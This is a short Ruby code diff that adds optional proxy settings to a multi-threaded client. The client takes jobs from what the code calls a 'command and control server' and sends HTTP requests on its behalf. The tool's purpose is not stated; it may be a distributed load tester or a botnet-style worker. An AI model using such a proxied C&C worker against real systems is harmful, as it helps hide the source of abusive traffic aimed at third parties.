@@ -1,6 +1,8 @@
 class Client
-	def initialize(server, thread_count)
+	def initialize(server, thread_count, proxy_host, proxy_port)
 		@server = server + "/api"
+		@proxy_host = proxy_host
+		@proxy_port = proxy_port
 		@has_job = false
 		@node_id = 1
 		@thread_count = thread_count
@@ -83,7 +85,9 @@ class Client
 
 	def send_request
 		req = Mechanize.new.tap do |r|
-			# r.set_proxy("localhost", 8080)
+			if @proxy_host
+				r.set_proxy(@proxy_host, @proxy_port)
+			end
 		end
 
 		if @http_method.downcase == "get"
@@ -132,8 +136,13 @@ class Client
 
 	def cc_stability_test
 		# Check status to C&C
-		cc_agent = Mechanize.new
-		response = cc_agent.head(@server + "/health")
+		req = Mechanize.new.tap do |r|
+			if @proxy_host
+				r.set_proxy(@proxy_host, @proxy_port)
+			end
+		end
+
+		response = req.head(@server + "/health")
 
 		if response.code.to_i != 200
 			puts "(!) Unable to communicate with command and control server"
